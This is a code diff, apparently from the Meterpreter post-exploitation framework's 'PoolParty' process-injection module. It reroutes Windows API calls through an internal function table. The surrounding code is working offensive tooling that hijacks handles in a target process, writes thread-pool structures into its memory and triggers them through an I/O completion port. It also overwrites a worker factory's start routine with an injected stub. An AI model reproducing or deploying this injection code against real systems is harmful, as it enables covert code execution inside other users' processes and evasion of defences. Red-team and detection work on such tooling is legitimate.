@@ -214,7 +214,7 @@ HANDLE GetRemoteHandle(HANDLE hProcess, LPCWSTR typeName, DWORD dwDesiredAccess)
     }
     dprintf("[INJECT][inject_via_poolparty][get_remote_handle] lpObjectInfo: %p", lpObjectInfo);
     for (ULONG i = 0; i < lpProcessInfo->NumberOfHandles; i++) {
-        if (DuplicateHandle(hProcess, lpProcessInfo->Handles[i].HandleValue, hCurrProcess, &hHijackHandle, dwDesiredAccess, FALSE, 0)) {
+        if (met_api->win_api.kernel32.DuplicateHandle(hProcess, lpProcessInfo->Handles[i].HandleValue, hCurrProcess, &hHijackHandle, dwDesiredAccess, FALSE, 0)) {
             ntStatus = pNtDll->pNtQueryObject(hHijackHandle, ObjectTypeInformation, lpObjectInfo, dwInformationSizeIn, &dwInformationSizeOut);
             dprintf("[INJECT][inject_via_poolparty][get_remote_handle] pNtQueryObject result: %p", ntStatus);
             if (dwInformationSizeIn >= dwInformationSizeOut) {
@@ -234,7 +234,7 @@ HANDLE GetRemoteHandle(HANDLE hProcess, LPCWSTR typeName, DWORD dwDesiredAccess)
                     break;
                 }
             }
-            CloseHandle(hHijackHandle);
+            met_api->win_api.kernel32.CloseHandle(hHijackHandle);
         }
         hHijackHandle = INVALID_HANDLE_VALUE;
     }
@@ -284,7 +284,7 @@ DWORD remote_tp_direct_insertion(HANDLE hProcess, DWORD dwDestinationArch, LPVOI
             if (!RemoteDirectAddress) {
                 BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Unable to allocate RemoteDirectAddress.", ERROR_NOT_SUPPORTED)
             }
-            if (!WriteProcessMemory(hProcess, RemoteDirectAddress, lpDirect, TP_DIRECT_STRUCT_SIZE_X64, NULL)) {
+            if (!met_api->win_api.kernel32.WriteProcessMemory(hProcess, RemoteDirectAddress, lpDirect, TP_DIRECT_STRUCT_SIZE_X64, NULL)) {
                 BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Unable to write target process memory.", ERROR_NOT_SUPPORTED)
             }
             dwResult = pNtDll->pZwSetIoCompletion(hHijackHandle, RemoteDirectAddress, lpParameter, 0, 0);
@@ -360,11 +360,11 @@ DWORD worker_factory_start_routine_overwrite(HANDLE hProcess, DWORD dwDestinatio
         if (lpOriginalBytes == NULL) {
             BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] OriginalBytes is NULL", ERROR_NOT_SUPPORTED);
         }
-        if (!ReadProcessMemory(hProcess, WorkerFactoryBasicInfo.StartRoutine, lpOriginalBytes, dwStubSize, NULL)) {
+        if (!met_api->win_api.kernel32.ReadProcessMemory(hProcess, WorkerFactoryBasicInfo.StartRoutine, lpOriginalBytes, dwStubSize, NULL)) {
             BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] ReadProcessMemory failed.", ERROR_NOT_SUPPORTED);
         }
         SIZE_T szWritten = 0;
-        if (!WriteProcessMemory(hProcess, WorkerFactoryBasicInfo.StartRoutine, lpStub, dwStubSize, &szWritten) || szWritten != dwStubSize) {
+        if (!met_api->win_api.kernel32.WriteProcessMemory(hProcess, WorkerFactoryBasicInfo.StartRoutine, lpStub, dwStubSize, &szWritten) || szWritten != dwStubSize) {
             BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] WriteProcessMemory failed, couldn't write stub to WorkerFactory's start routine.", ERROR_NOT_SUPPORTED);
         }
 
@@ -397,7 +397,7 @@ DWORD worker_factory_start_routine_overwrite(HANDLE hProcess, DWORD dwDestinatio
         dprintf("[INJECT][inject_via_poolparty][DEBUG WORKER FACTORY] WorkerFactoryBasicInfo.LastThreadCreationStatus = %p", WorkerFactoryBasicInfo.LastThreadCreationStatus);
         //
 
-        if (!WriteProcessMemory(hProcess, WorkerFactoryBasicInfo.StartRoutine, lpOriginalBytes, dwStubSize, &szWritten) || szWritten != dwStubSize) {
+        if (!met_api->win_api.kernel32.WriteProcessMemory(hProcess, WorkerFactoryBasicInfo.StartRoutine, lpOriginalBytes, dwStubSize, &szWritten) || szWritten != dwStubSize) {
             BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] WriteProcessMemory failed, couldn't restore the original bytes.", ERROR_NOT_SUPPORTED);
         }
         WorkerFactoryBasicInfo.ThreadMinimum = uThreadMinimum;
@@ -457,3 +457,4 @@ DWORD worker_factory_start_routine_overwrite(HANDLE hProcess, DWORD dwDestinatio
 //	} while (0);
 //	return dwResult;
 //}
+#endif //_METERPRETER_POOLPARTY_C
